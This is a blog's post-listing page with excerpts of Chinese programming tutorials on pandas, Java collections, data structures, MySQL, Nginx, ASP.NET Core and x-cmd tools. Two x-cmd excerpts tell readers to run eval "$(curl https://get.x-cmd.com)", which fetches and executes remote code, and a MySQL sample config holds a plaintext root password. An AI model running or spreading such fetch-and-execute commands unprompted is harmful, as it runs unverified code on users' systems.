<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程大白的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bcdabai.github.io/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程大白的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2939ec9a51a850b55da91051bf06405/" rel="bookmark">
			机器学习-案例：流行电影统计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		机器学习–案例：流行电影统计 现在我们有一组从2006年到2016年1000部最流行的电影数据
数据来源：https://www.kaggle.com/damianpanek/sunday-eda/data
问题1：我们想知道这些电影数据中评分的平均分，导演的人数等信息，我们应该怎么获取？问题2：对于这一组电影数据，如果我们想rating，runtime的分布情况，应该如何呈现数据？问题3：对于这一组电影数据，如果我们希望统计电影分类(genre)的情况，应该如何处理数据？ 实现 首先获取导入包，获取数据
%matplotlib inline import pandas as pd import numpy as np from matplotlib import pyplot as plt #文件的路径 path = "./IMDB-Movie-Data.csv" #读取文件 df = pd.read_csv(path) 问题一： 我们想知道这些电影数据中评分的平均分，导演的人数等信息，我们应该怎么获取？
得出评分的平均分 使用mean函数
df["Rating"].mean() 得出导演人数信息 求出唯一值，然后进行形状获取
## 导演的人数 # df["Director"].unique().shape[0] np.unique(df["Director"]).shape[0] 问题二： 对于这一组电影数据，如果我们想Rating，**Runtime (Minutes)**的分布情况，应该如何呈现数据？
直接呈现，以直方图的形式 选择分数列数据，进行plot
df["Rating"].plot(kind='hist',figsize=(20,8)) Rating进行分布展示 进行绘制直方图
plt.figure(figsize=(20,8),dpi=80) plt.hist(df["Rating"].values,bins=20) plt.show() 修改刻度的间隔
# 求出最大最小值 max_ = df["Rating"].max() min_ = df["Rating"].min() # 生成刻度列表 t1 = np.linspace(min_,max_,num=21) # [ 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f2939ec9a51a850b55da91051bf06405/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6afb120360522455272705b2d99c0ce4/" rel="bookmark">
			数据结构（顺序表）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、线性表1、线性表1.1、线性表的定义1.2、线性表的操作 2、顺序表2.1、顺序表的实现--静态分配2.2、顺序表的实现--动态分配2.2、顺序表的特点 3、顺序表的基本操作3.1、插入操作3.2、删除操作3.3、查找操作3.2、按位查找3.2、按值查找 一、线性表 1、线性表 1.1、线性表的定义 1.2、线性表的操作 2、顺序表 2.1、顺序表的实现–静态分配 静态的数组分配后固定不变
Sq:sequence–顺序，序列
#include&lt;stdio.h&gt; #define MaxSize 10 typedef struct{ int data[MaxSize]; int length; }SqList; void InitList(SqList &amp;L){ for(int i=0;i&lt;MaxSize;i++){ L.data[i]=0; } L.length=0; } int main(){ SqList L; InitList(L); for(int i=0;i&lt;MaxSize;i++) printf("data=%d\n",L.data[i]); return 0; } 2.2、顺序表的实现–动态分配 #include&lt;stdlib.h&gt; #define InitSize 10 //结构体 typedef struct{ int *data; int MaxSize; int length; }SeqList; //初始化顺序表 void InitList(SeqList &amp;L){ L.data=(int *)malloc(InitSize*sizeof(int)); L.MaxSize=InitSize; L.length=0; } //增加长度操作 void IncreaseSize(SeqList &amp;L,int len){ int *p=L.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6afb120360522455272705b2d99c0ce4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64b7fea92d087b8232f2e8a929d21ca2/" rel="bookmark">
			Java集合（四）Map、HashMap
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 【Map】一、Map简介二、常见Map实现类比较*2.1 HashMap和TreeMap2.2 HashMap和ConcurrentHashMap2.3 ConcurrentHashMap和Hashtable2.4 HashTable和HashMap 三、Map的相关问题3.1 Map接口提供了哪些不同的集合视图*3.2 在解决hash冲突的时候，为什么选择先用链表，再转红黑树*3.3 HashMap设计成数组（哈希表）+链表（和红黑树）的优点 【HashMap】一、HashMap介绍1.1 HashMap的特点*1.2 HashMap的使用 二、从源码理解HashMap2.1 Node*2.2 哈希函数*2.3 创建HashMap对象2.4 添加元素*2.5 删除元素2.6 获取元素2.7 是否包含某个key/value2.8 遍历2.9 扩容机制* 三、HashMap常见问题3.1 HashMap的设计相关问题3.1.1 HashMap的数组长度为什么一定是2的次幂*3.1.2 HashMap默认加载因子为什么是0.75*3.1.3 HashMap链表转红黑树的阈值为什么是83.1.4 HashMap红黑树转链表的阈值为什么是63.1.5 HashMap是怎么解决哈希冲突的3.1.6 负载因子的大小，对HashMap有什么影响 3.2 HashMap在JDK1.7和JDK1.8中的区别*3.3 HashMap中的key*3.4 HashMap为什么不直接使用hashCode()处理后的哈希值直接作为table的下标3.5 HashMap在多线程下的问题3.5.1 JDK1.7中HashMap在多线程环境下的问题（死循环）*3.5.2 JDK1.8中HashMap在多线程环境下的问题（数据覆盖）* Java集合（一）集合框架概述
Java集合（二）List、ArrayList、LinkedList
Java集合（三）CopyOnWriteArrayList、Vector、Stack
Java集合（四）Map、HashMap
Java集合（五）LinkedHashMap、TreeMap
Java集合（六）Hashtable、ConcurrentHashMap
Java集合（七）Set、HashSet、LinkedHashSet、TreeSet
Java集合（八）BlockingQueue、ArrayBlockingQueue、LinkedBlockingQueue、PriorityBlockingQueue、DelayQueue
【Map】 一、Map简介 Collection接口的实现类中存储的是具体的单个元素，Map中存储的是键值对。
常用的Map实现类有：HashMap、LinkedHashMap、TreeMap、HashTable和ConcurrentHashMap。
优点缺点HashMap基于哈希表实现，查询快，效率高元素存储时无序，非线程安全LinkedHashMap基于哈希表和链表实现，可以保留元素插入时的顺序非线程安全TreeMap存储的元素有序非线程安全HashTable线程安全，不允许null值效率低ConcurrentHashMap线程安全，性能较好 至于具体使用哪个Map时，参考：
在Map中，HashMap是适用性最广的。也就是说如果要确定用Map，但不确定用哪种Map，一般可以使用HashMap。
如果要用线程安全的Map，就用ConcurrentHashMap。
二、常见Map实现类比较* 2.1 HashMap和TreeMap HashMapTreeMap是否线程安全非线程安全非线程安全元素是否排序否是效率高（哈希表）低（树）底层实现JDK1.7是数组+链表，JDK1.8是数组+链表+红黑树红黑树适用场景元素不需要排序元素需要排序 2.2 HashMap和ConcurrentHashMap HashMapConcurrentHashMap是否线程安全非线程安全线程安全底层实现数组+链表(JDK1.8之前)
数组+链表+红黑树(JDK1.8之后)segment数组+链表(JDK1.8之前)
数组+链表+红黑树(JDK1.8之后)是否支持Null值键值都允许有Null键值都不允许有Null 可以将ConcurrentHashMap理解为HashMap的高并发版本。
2.3 ConcurrentHashMap和Hashtable ConcurrentHashMapHashtable线程安全的实现方式JDK1.7是segment分段锁
JDK1.8是CAS和synchronized全局synchronized锁效率高低默认大小1611扩容2倍newCapacity = oldCapacity * 2 + 1底层数据结构JDK1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64b7fea92d087b8232f2e8a929d21ca2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/49684fb705706ec72bed0e68367938aa/" rel="bookmark">
			Java集合（三）CopyOnWriteArrayList、Vector、Stack
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 【CopyOnWriteArrayList】一、CopyOnWriteArrayList介绍1.1 CopyOnWriteArrayList的特点*1.2 CopyOnWriteArrayList的使用 二、从源码理解CopyOnWriteArrayList2.1 创建对象2.2 添加元素2.3 删除元素2.4 获取元素2.5 遍历元素 三、相关问题3.1 CopyOnWriteArrayList的迭代器支持fast-fail吗* 【Vector】一、Vector介绍1.1 Vector的特点*1.2 Vector的使用 二、从源码理解Vector2.1 创建Vector对象2.2 自动扩容*2.3 添加元素2.4 删除元素2.5 更新元素2.6 获取元素2.7 检索元素 【Stack】一、Stack介绍1.1 Stack的特点*1.2 Stack的使用 二、从源码理解Stack2.1 创建对象2.2 添加（栈顶）元素2.3 删除（栈顶）元素2.4 获取（栈顶）元素2.5 判断Stack是否为空2.6 获取元素相对于栈顶的位置* 本系列文章：
Java集合（一）集合框架概述
Java集合（二）List、ArrayList、LinkedList
Java集合（三）CopyOnWriteArrayList、Vector、Stack
Java集合（四）Map、HashMap
Java集合（五）LinkedHashMap、TreeMap
Java集合（六）Hashtable、ConcurrentHashMap
Java集合（七）Set、HashSet、LinkedHashSet、TreeSet
Java集合（八）BlockingQueue、ArrayBlockingQueue、LinkedBlockingQueue、PriorityBlockingQueue、DelayQueue
【CopyOnWriteArrayList】 一、CopyOnWriteArrayList介绍 在很多应用场景中，读操作可能会远远大于写操作。由于读操作根本不会修改原有的数据，因此对于每次读取都进行加锁其实是一种资源浪费。我们可以允许多个线程同时访问List 的内部数据，毕竟读取操作是安全的。CopyOnWriteArrayList恰恰符合这种要求。
CopyOnWriteArrayList位于JUC包下，可以说是读写分离、以空间换时间版的ArrayList。其继承关系和ArrayList也是一致的：
public class CopyOnWriteArrayList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable CopyOnWriteArrayList是一个线程安全、并且在读操作时无锁的ArrayList，其底层实现也是数组。不止读操作时无锁，写入也不会阻塞读取操作。只有写入和写入之间需要进行同步等待。
CopyOnWriteArrayList 类的所有可变操作（add、set等）都是通过创建底层数组的新副本来实现的。当List需要被修改的时候，并不修改原有内容，而是对原有数据进行一次复制，副本用来写，原来的数据用来读。写完之后，再将修改完的副本替换原来的数据，这样就可以保证写操作不会影响读操作。
1.1 CopyOnWriteArrayList的特点* 1、线程安全
CopyOnWriteArrayList所有写操作，都是通过对底层数组进行一次新的复制来实现，是线程安全的。2、适合读操作大于写操作的场景
CopyOnWriteArrayList适合使用在读操作远远大于写操作的场景里，比如缓存。CopyOnWriteArrayList不存在扩容的概念，每次写操作都要复制一个副本，在副本的基础上修改后改变原来的引用。CopyOnWriteArrayList中写操作需要大面积复制数组，所以性能差。3、内存消耗较大
CopyOnWriteArrayList虽然读多写少的场景，不过要慎用 ，因为当CopyOnWriteArrayList存放的数据比较多时，每次add/set都要重新复制数组，这个代价实在太高。4、数据一致性
CopyOnWrite容器只能保证数据的最终一致性，不能保证数据的实时一致性。写和读分别作用在新老不同容器上，在写操作执行过程中，读不会阻塞但读取到的却是老容器的数据。5、读写分离，效率高
采用读写分离方式，读的效率非常高。CopyOnWriteArrayList的迭代器是基于创建时的数据快照的，故数组的增删改不会影响到迭代器。6、支持随机读
由于CopyOnWriteArrayList底层实现数组，数据存在连续的内存上，因此支持随机读。 1.2 CopyOnWriteArrayList的使用 1、构造方法
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/49684fb705706ec72bed0e68367938aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/45b0fad283a6a94464f0c81706747cc8/" rel="bookmark">
			Java集合（一）集合框架概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、集合框架1.1 集合体系*1.2 迭代器1.2.1 Iterator迭代器1.2.2 ListIterator迭代器1.2.3 两者的区别 1.3 线程安全*1.3.1 线程安全的集合1.3.2 线程不安全的集合 1.4 两种fail机制1.4.1 fail-fast机制*1.4.2 不同情形下的fail-fast1.4.3 解决fail-fast的方法1.3.3 fail-safe机制* 1.5 集合相关问题1.5.1 集合和数组的区别1.5.2 怎么确保一个集合不能被修改1.5.3 为何没有像Iterator.add()这样的方法，向集合中添加元素1.5.4 集合框架中的泛型有什么优点1.5.5 用哪两种方式来实现集合的排序1.5.6 集合框架使用注意事项 二、Collections工具类2.1 排序相关方法2.1.1 Collections.sort的底层实现2.1.2 Collections.sort的两种形式2.1.3 Comparable*2.1.4 Comparator*2.1.5 Comparable和Comparator的区别* 2.2 查找替换方法2.3 同步控制方法2.4 使用Collections的最佳实践 本系列文章：
Java集合（一）集合框架概述
Java集合（二）List、ArrayList、LinkedList
Java集合（三）CopyOnWriteArrayList、Vector、Stack
Java集合（四）Map、HashMap
Java集合（五）LinkedHashMap、TreeMap
Java集合（六）Hashtable、ConcurrentHashMap
Java集合（七）Set、HashSet、LinkedHashSet、TreeSet
Java集合（八）BlockingQueue、ArrayBlockingQueue、LinkedBlockingQueue、PriorityBlockingQueue、DelayQueue
一、集合框架 集合框架：用于存储数据的容器。集合框架是为表示和操作集合而规定的一种统一的标准的体系结构。任何集合框架都包含三大块内容：
1、接口
表示集合的抽象数据类型。接口允许我们操作集合时不必关注具体实现，从而达到“多态”。在面向对象编程语言中，接口通常用来形成规范。2、实现
集合接口的具体实现，是重用性很高的数据结构。3、算法
在一个实现了某个集合框架中的接口的对象身上完成某种有用的计算的方法，例如查找、排序等。这些算法通常是多态的，因为相同的方法可以在同一个接口被多个类实现时有不同的表现。 常见的集合对比：
1.1 集合体系* Collection接口和Map接口是所有集合框架的父接口。
Collection接口的父接口是Iterable接口，Collection接口的子接口包括：Set接口、List接口和Queue接口。
1、Collection体系
由上图可知：Collection继承了Iterable，Iterable中有3个方法： //获取迭代器 Iterator&lt;T&gt; iterator(); //for each循环 default void forEach(Consumer&lt;? super T&gt; action); //并行迭代器循环 default Spliterator&lt;T&gt; spliterator(); Iterator是迭代器接口，定义了几个迭代操作的方法，也就是需要具体的实现类去实现的迭代器逻辑：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/45b0fad283a6a94464f0c81706747cc8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/37b22062b770a3bbec4fc93512a098f1/" rel="bookmark">
			x-cmd pkg | haxor-news - Hacker News CLI
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 简介首次用户功能特点进一步探索 简介 haxor-news 是一个用于在终端上查看 Hacker News 的内容。它可以让你在命令行查看/过滤 Hacker News 的帖子、评论、用户信息等，如过去 60 分钟内发布的最新评论。
Hacker News 是一家由 Paul Graham 创建的关于计算机黑客和创业公司的社交新闻网站，用户可以在这里分享和讨论与技术和创业相关的新闻、文章和话题。
首次用户 使用 x env use haxor-news 即可自动下载并使用
在终端运行 eval "$(curl https://get.x-cmd.com)" 即可完成 x 命令安装, 详情参考 x-cmd 官网 x-cmd 提供1分钟教程，其中包含了 haxor-news 命令常用功能的 demo 示例，可以帮你快速上手 haxor-news 。
使用案例:
# 安装 haxor-news x env use haxor-news # 查看帖子 hn top hn show 20 # 启用交互式 haxor-news # 查看帖子的链接网页内容 hn view 1 # 查看帖子的所有评论 hn view 1 -c 功能特点 高效的命令行交互: Haxor News 能够在终端中使用快捷键进行浏览和操作。除了 vim 快捷键，它还提供了很多其他快捷操作，这使得用户可以在终端中快速查看新闻、文章和评论。轻量级: 工具的设计目标之一是保持轻量级。用户可以在终端中使用简单的命令来获取和查看 Hacker News 上的信息。文章检索: 用户可以使用工具检索和查看 Hacker News 上的热门文章。这使得用户能够快速访问当前的技术和创业话题。评论浏览: Hacker News 提供多种评论筛选功能， 如查看还没阅读的，最新的，或者是通过正则匹配来查找评论 进一步探索 Haxor News Cheat Sheet - 在这个官方文档可以详细的了解 Haxor News 的配置技巧。wiki: Hacker News - Hacker News 的维基百科，介绍其历史缘由。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be4a2f442c9f0fe22345abf1b37373b5/" rel="bookmark">
			x-cmd pkg | httpx - 为 Python 设计的下一代 HTTP 客户端库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 简介首次用户功能特点进一步探索 简介 HTTPX 是一个为 Python 设计的下一代 HTTP 客户端库，由 Tom Christie 创建。它提供了同步和异步的 API，并支持 HTTP/1.1 和 HTTP/2 协议。与 Requests 库类似，但增加了对异步请求的支持和 HTTP/2 的支持，使其在需要高性能和现代网络特性的场景下特别有用。
首次用户 使用 x env use httpx 即可自动下载并使用
在终端运行 eval "$(curl https://get.x-cmd.com)" 即可完成 x 命令安装, 详情参考 x-cmd 官网 x-cmd 提供1分钟教程，其中包含了 httpx 命令常用功能的 demo 示例，可以帮你快速上手 httpx 。
使用案例:
# 安装 x env use httpx x env use httpx # 使用 httpx 访问一个网站 httpx https://httpbin.org/get # 通过 --json 参数发送 json 数据，此时 httpx 会自动设置 Content-Type 为 application/json，以及 method 为 POST httpx --json "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/be4a2f442c9f0fe22345abf1b37373b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ea00059271394203b6d647996675690/" rel="bookmark">
			【fabric.js】toDataURL 性能问题、优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		必要解释：最好看完。。省流版的话，toDataURL 的 multiplier参数不要设置超过500；
情景：在做某些功能的时候涉及到图形的预览，预览的时候是导出为40*40 像素的图片，当碰到某些图形非常小的时候，例如该图形是0.01宽/0.01高，那么如果想要得到该图形40*40大小的图片则需要放大非常大的倍数 multiplier，从而导致 toDataURL 一个函数就需要执行1秒(根据放大倍数而定)，且放大的倍数 multiplier 有一个临界值，当multiplier的值超过xxx时，multiplier每提高一段倍数，所需的时间更长。例如multiplier800是1秒，multiplier1200是2秒 （当时情况已经忘了，所以只是打个比方，感兴趣的自己测下就知道了）。。
吐槽：当时解决大量图形的性能瓶颈，解决完虚拟化列表后，自测时还是发现某些情况下（某些素材）加载时、操作时有性能问题，当时找了半天最后才发现是 toDataURL 导致的性能问题；
解决方案： 宽||高超过40的就是缩小了，不存在性能问题；
0.01*0.01的图形放大至40的时候，40/0.01就会得到4000的倍率，而且这么这么小的图形即使放大，也看不清，故而采取措施为将该图形不进行图片提取，反正拿到图片你也看不见这图形，不如不拿就完事了。。
本文其实就是讲解思路和问题点所在，代码案例写不写无所谓，没啥复杂的，但也分享下自己案例的相关片段；
val.clone(async (newShape: fabric.Object) =&gt; { const options = { strokeWidth: 1, } as any; if (newShape.stroke) { options.stroke = newShape.processMode === ProcessMode.cut ? newShape.originStrokeForCut : newShape.originStroke; } const w = newShape.width &amp;&amp; 30 / (newShape.width * (newShape.scaleX as number)); const h = newShape.height &amp;&amp; 30 / (newShape.height * (newShape.scaleY as number)); const multiplier = Math.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9ea00059271394203b6d647996675690/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ba58a6c0469082fa964d3ce743452f08/" rel="bookmark">
			计算机设计大赛 卷积神经网络手写字符识别 - 深度学习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0 前言1 简介2 LeNet-5 模型的介绍2.1 结构解析2.2 C1层2.3 S2层S2层和C3层连接 2.4 F6与C5层 3 写数字识别算法模型的构建3.1 输入层设计3.2 激活函数的选取3.3 卷积层设计3.4 降采样层3.5 输出层设计 4 网络模型的总体结构5 部分实现代码6 在线手写识别7 最后 0 前言 🔥 优质竞赛项目系列，今天要分享的是
🚩 卷积神经网络手写字符识别 - 深度学习
该项目较为新颖，适合作为竞赛课题方向，学长非常推荐！
🥇学长这里给一个题目综合评分(每项满分5分)
难度系数：3分工作量：3分创新点：4分 🧿 更多资料, 项目分享：
https://gitee.com/dancheng-senior/postgraduate
1 简介 该设计学长使用python基于TensorFlow设计手写数字识别算法，并编程实现GUI界面，构建手写数字识别系统。
这是学长做的深度学习demo，大家可以用于毕业设计。
这里学长不会以论文的形式展现，而是以编程实战完成深度学习项目的角度去描述。
项目要求：主要解决的问题是手写数字识别，最终要完成一个识别系统。
设计识别率高的算法，实现快速识别的系统。
2 LeNet-5 模型的介绍 学长实现手写数字识别，使用的是卷积神经网络，建模思想来自LeNet-5，如下图所示：
2.1 结构解析 这是原始的应用于手写数字识别的网络，我认为这也是最简单的深度网络。
LeNet-5不包括输入，一共7层，较低层由卷积层和最大池化层交替构成，更高层则是全连接和高斯连接。
LeNet-5的输入与BP神经网路的不一样。这里假设图像是黑白的，那么LeNet-5的输入是一个32*32的二维矩阵。同
时，输入与下一层并不是全连接的，而是进行稀疏连接。本层每个神经元的输入来自于前一层神经元的局部区域(5×5)，卷积核对原始图像卷积的结果加上相应的阈值，得出的结果再经过激活函数处理，输出即形成卷积层（C层）。卷积层中的每个特征映射都各自共享权重和阈值，这样能大大减少训练开销。降采样层（S层）为减少数据量同时保存有用信息，进行亚抽样。
2.2 C1层 第一个卷积层（C1层）由6个特征映射构成，每个特征映射是一个28×28的神经元阵列，其中每个神经元负责从5×5的区域通过卷积滤波器提取局部特征。一般情况下，滤波器数量越多，就会得出越多的特征映射，反映越多的原始图像的特征。本层训练参数共6×(5×5+1)=156个，每个像素点都是由上层5×5=25个像素点和1个阈值连接计算所得，共28×28×156=122304个连接。
2.3 S2层 S2层是对应上述6个特征映射的降采样层（pooling层）。pooling层的实现方法有两种，分别是max-pooling和mean-
pooling，LeNet-5采用的是mean-
pooling，即取n×n区域内像素的均值。C1通过2×2的窗口区域像素求均值再加上本层的阈值，然后经过激活函数的处理，得到S2层。pooling的实现，在保存图片信息的基础上，减少了权重参数，降低了计算成本，还能控制过拟合。本层学习参数共有1*6+6=12个，S2中的每个像素都与C1层中的2×2个像素和1个阈值相连，共6×(2×2+1)×14×14=5880个连接。
S2层和C3层连接 S2层和C3层的连接比较复杂。C3卷积层是由16个大小为10×10的特征映射组成的，当中的每个特征映射与S2层的若干个特征映射的局部感受野（大小为5×5）相连。其中，前6个特征映射与S2层连续3个特征映射相连，后面接着的6个映射与S2层的连续的4个特征映射相连，然后的3个特征映射与S2层不连续的4个特征映射相连，最后一个映射与S2层的所有特征映射相连。
此处卷积核大小为5×5，所以学习参数共有6×(3×5×5+1)+9×(4×5×5+1)+1×(6×5×5+1)=1516个参数。而图像大小为28×28，因此共有151600个连接。
S4层是对C3层进行的降采样，与S2同理，学习参数有16×1+16=32个，同时共有16×(2×2+1)×5×5=2000个连接。
C5层是由120个大小为1×1的特征映射组成的卷积层，而且S4层与C5层是全连接的，因此学习参数总个数为120×(16×25+1)=48120个。
2.4 F6与C5层 F6是与C5全连接的84个神经元，所以共有84×(120+1)=10164个学习参数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ba58a6c0469082fa964d3ce743452f08/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/412b5ffcaea683b1485e234f4b55b3c3/" rel="bookmark">
			JavaWeb基础01-基本技术体系介绍和相关工具的安装
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、JavaWeb 1.概述 Web：全球广域网，也称为万维网(www)，能够通过浏览器访问的网站JavaWeb：是用Java技术来解决相关web互联网领域的技术栈 2.组成 （1）网页：展示数据（前端技术） HTML+CSSJavaScriptAjax，Vue，ElementUI…（前端框架） （2）数据：存储/管理数据（后端技术） MySQLJDBCMyBatis… （3）JavaWeb程序：逻辑处理（后端技术） Tomcat，HTTP，ServletRequest，ResponseJSPCookie，SessionFilter，Listener… 二、数据库的简单介绍和安装 1.数据库概述 DataBase：简称DB存储数据的仓库，数据是有组织的进行存储 2.数据库管理系统 DataBase Management System，简称 DBMS管理数据库的大型软件 3.SQL Structured Query Language，简称 SQL，结构化查询语言操作关系型数据库的编程语言定义操作所有关系型数据库的统一标准 4.常见的关系型数据库管理系统 Oracle： 收费的大型数据库，Oracle 公司的产品MySQL： 开源免费的中小型数据库。后来 Sun公司收购了 MySQL，而Sun 公司又被 Oracle 收购SQL Server： MicroSoft 公司收费的中型的数据库。C#、.net 等语言常使用PostgreSQL：开源免费中小型的数据库DB2：IBM公司的大型收费数据库产品sQLite：嵌入式的微型数据库。如：作为Android 内置数据库MariaDB：开源免费中小型的数据库 5.常见的非关系型数据库管理系统 先了解一下，以后再说
ReadisMemcachedMongoDBCouchDBCouchbase… 6.MySQL数据库的安装 （1）安装 https://downloads.mysql.com/archives/community/
解压版（绿色版）【比较麻烦，傻瓜安装式如果没有问题可直接无视这个~】 点连接之后选择版本，推荐与最新版本差3个或3个之内（大版本）
下载之后解压
目录说明自行搜索
配置环境变量
在根目录新建配置文件my.ini，将下面内容粘进去
[client] # 设置mysql客户端默认字符集 default-character-set=utf8 user = root password = root [mysqld] #设置3306端口 port = 3306 # 设置mysql的安装目录 这块换成自己解压的路径 basedir= D:\MySQL\mysql-5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/412b5ffcaea683b1485e234f4b55b3c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d2f68d4ab0c29ef3432f64ede7035bd/" rel="bookmark">
			Nginx 反向代理 负载均衡
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		准备三台虚拟机ip分别是192.168.65.8 192.168.65.9 192.168.65.10 三台虚拟机进行环境安装
apt-get install nginx 安装完后测试
最终看到如上的Nginx欢迎界面，代表Nginx安装完成
分别在192.168.65.8和192.168.65.10上修改前端页面使得更好区分
在192.168.65.9上修改一下nginx.conf的配置然后进行重启
所有的前提工作准备好，紧接着再启动Nginx
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bbd702100b81e510e6f0597a8f4cfe47/" rel="bookmark">
			在 ASP.NET Core Web API 中使用操作筛选器统一处理通用操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言：什么是操作筛选器 操作筛选器是 ASP.NET Core Web API 中的一种过滤器，用于在执行控制器操作（Action）之前或之后执行一些代码，完成特定的功能，比如执行日志记录、身份验证、授权、异常处理等通用的处理逻辑。
每次 ASP.NET Core Web API 中控制器的操作方法被执行的时候，操作筛选器都会被执行，所以操作筛选器默认是应用于所有控制器的操作方法的。
一个项目中可以注册多个操作筛选器，这些操作筛选器组成一个链，上一个筛选器执行完了再执行下一个。next 就是一个用来指向下一个操作筛选器的委托，如果当前的操作筛选器是最后一个筛选器的话，next 就会执行要执行的操作方法。
操作筛选器跟前文（见《如何在 ASP.NET Core Web API 方法执行前后 “偷偷“ 作一些 “坏“ 事？初识 ActionFilterAttribute》）讲过的 ActionFilterAttribute 比较相似，ActionFilterAttribute 是用于将操作筛选器逻辑应用于控制器操作的一种方式，而操作筛选器是一种更广泛的概念，可以说，ActionFilterAttribute 是操作筛选器的一种特定实现方式，它通过特性的方式将操作筛选器逻辑应用于控制器操作。
Step By Step 步骤 创建一个 ASP.NET Core Web API 项目
编写两个自定义的操作筛选器 MyActionFilter1 和 MyActionFilter2，实现 IAsyncActionFilter 接口（注意看代码中的注释）
using Microsoft.AspNetCore.Mvc.Filters; public class MyActionFilter1 : IAsyncActionFilter { // context 参数代表 Action 执行的上下文对象，从 context 中我们可以获取请求的路径、参数值等信息 // next 参数代表下一个要执行的操作筛选器 public async Task OnActionExecutionAsync( ActionExecutingContext context, ActionExecutionDelegate next) { // next 之前的代码是在操作方法执行之前要执行的代码 Console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bbd702100b81e510e6f0597a8f4cfe47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fde9a0626921ffcd0dfeab1bf24a08c0/" rel="bookmark">
			Element修改树结构样式--虚线树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景 修改前端Element组件el-tree样式
实现 1.虚线树
